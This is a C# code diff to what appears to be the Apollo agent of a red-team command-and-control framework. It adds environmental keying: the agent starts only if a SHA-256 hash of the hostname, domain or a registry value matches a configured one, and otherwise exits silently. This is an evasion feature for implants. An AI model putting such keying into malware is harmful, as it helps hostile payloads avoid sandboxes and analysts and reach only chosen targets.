@@ -14,6 +14,8 @@ using ApolloInterop.Classes.Events;
 using ApolloInterop.Enums.ApolloEnums;
 using System.Runtime.InteropServices;
 using ApolloInterop.Utils;
+using System.Security.Cryptography;
+using Microsoft.Win32;
 
 namespace Apollo
 {
@@ -55,8 +57,209 @@ namespace Apollo
             {
                 DebugHelp.DebugWriteLine($"CoInitializeSecurity status: {_security_init}");
             }
+            
+            // Check environmental keying before starting agent
+            if (!CheckEnvironmentalKeying())
+            {
+                // Exit silently if keying check fails
+                return;
+            }
+            
             Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
             ap.Start();
+        }
+        
+        private static bool CheckEnvironmentalKeying()
+        {
+            // If keying is not enabled, always return true
+            if (!Config.KeyingEnabled)
+            {
+                return true;
+            }
+            
+            try
+            {
+                // Handle Registry keying separately (3 = Registry)
+                if (Config.KeyingMethod == 3)
+                {
+                    return CheckRegistryKeying();
+                }
+                
+                string currentValue = "";
+                
+                // Get the appropriate value based on keying method
+                // 1 = Hostname, 2 = Domain
+                if (Config.KeyingMethod == 1)
+                {
+                    currentValue = Environment.MachineName;
+                }
+                else if (Config.KeyingMethod == 2)
+                {
+                    currentValue = Environment.UserDomainName;
+                }
+                else
+                {
+                    // Unknown keying method, fail safe and exit
+                    return false;
+                }
+                
+                // Convert to uppercase before hashing (same as build time)
+                currentValue = currentValue.ToUpper();
+                
+                // For hostname (1), just check the single value
+                if (Config.KeyingMethod == 1)
+                {
+                    string currentValueHash = ComputeSHA256Hash(currentValue);
+                    if (currentValueHash.Equals(Config.KeyingValueHash, StringComparison.OrdinalIgnoreCase))
+                    {
+                        return true;
+                    }
+                }
+                // For domain (2), check full domain and all parts split by '.'
+                else if (Config.KeyingMethod == 2)
+                {
+                    // First try the full domain
+                    string fullDomainHash = ComputeSHA256Hash(currentValue);
+                    if (fullDomainHash.Equals(Config.KeyingValueHash, StringComparison.OrdinalIgnoreCase))
+                    {
+                        return true;
+                    }
+                    
+                    // Then try each part of the domain split by '.'
+                    string[] domainParts = currentValue.Split('.');
+                    foreach (string part in domainParts)
+                    {
+                        if (!string.IsNullOrEmpty(part))
+                        {
+                            string partHash = ComputeSHA256Hash(part);
+                            if (partHash.Equals(Config.KeyingValueHash, StringComparison.OrdinalIgnoreCase))
+                            {
+                                return true;
+                            }
+                        }
+                    }
+                }
+                
+                // Keying check failed
+                return false;
+            }
+            catch
+            {
+                // If any error occurs during keying check, fail safe and exit
+                return false;
+            }
+        }
+        
+        private static bool CheckRegistryKeying()
+        {
+            try
+            {
+                // Parse the registry path
+                string regPath = Config.RegistryPath;
+                if (string.IsNullOrEmpty(regPath))
+                {
+                    return false;
+                }
+                
+                // Split registry path into hive, subkey, and value name
+                // Expected format: HKLM\SOFTWARE\Path\To\Key\ValueName
+                string[] pathParts = regPath.Split('\\');
+                if (pathParts.Length < 2)
+                {
+                    return false;
+                }
+                
+                // Get the registry hive
+                RegistryKey hive = GetRegistryHive(pathParts[0]);
+                if (hive == null)
+                {
+                    return false;
+                }
+                
+                // Get the value name (last part)
+                string valueName = pathParts[pathParts.Length - 1];
+                
+                // Get the subkey path (everything between hive and value name)
+                string subKeyPath = string.Join("\\", pathParts, 1, pathParts.Length - 2);
+                
+                // Open the registry key
+                using (RegistryKey key = hive.OpenSubKey(subKeyPath))
+                {
+                    if (key == null)
+                    {
+                        // Registry key doesn't exist
+                        return false;
+                    }
+                    
+                    // Get the registry value
+                    object regValue = key.GetValue(valueName);
+                    if (regValue == null)
+                    {
+                        // Registry value doesn't exist
+                        return false;
+                    }
+                    
+                    string regValueString = regValue.ToString();
+                    
+                    // Check based on comparison mode: 1 = Matches, 2 = Contains
+                    if (Config.RegistryComparison == 1)
+                    {
+                        // Hash-based secure matching
+                        string regValueHash = ComputeSHA256Hash(regValueString.ToUpper());
+                        return regValueHash.Equals(Config.KeyingValueHash, StringComparison.OrdinalIgnoreCase);
+                    }
+                    else if (Config.RegistryComparison == 2)
+                    {
+                        // Plaintext contains matching (weak security)
+                        return regValueString.IndexOf(Config.RegistryValue, StringComparison.OrdinalIgnoreCase) >= 0;
+                    }
+                }
+                
+                return false;
+            }
+            catch
+            {
+                // If any error occurs, fail safe and exit
+                return false;
+            }
+        }
+        
+        private static RegistryKey GetRegistryHive(string hiveName)
+        {
+            switch (hiveName.ToUpper())
+            {
+                case "HKLM":
+                case "HKEY_LOCAL_MACHINE":
+                    return Registry.LocalMachine;
+                case "HKCU":
+                case "HKEY_CURRENT_USER":
+                    return Registry.CurrentUser;
+                case "HKCR":
+                case "HKEY_CLASSES_ROOT":
+                    return Registry.ClassesRoot;
+                case "HKU":
+                case "HKEY_USERS":
+                    return Registry.Users;
+                case "HKCC":
+                case "HKEY_CURRENT_CONFIG":
+                    return Registry.CurrentConfig;
+                default:
+                    return null;
+            }
+        }
+        
+        private static string ComputeSHA256Hash(string input)
+        {
+            using (SHA256 sha256 = SHA256.Create())
+            {
+                byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(input));
+                StringBuilder sb = new StringBuilder();
+                foreach (byte b in hashBytes)
+                {
+                    sb.Append(b.ToString("x2"));
+                }
+                return sb.ToString();
+            }
         }
 
         private static void Client_Disconnect(object sender, NamedPipeMessageArgs e)
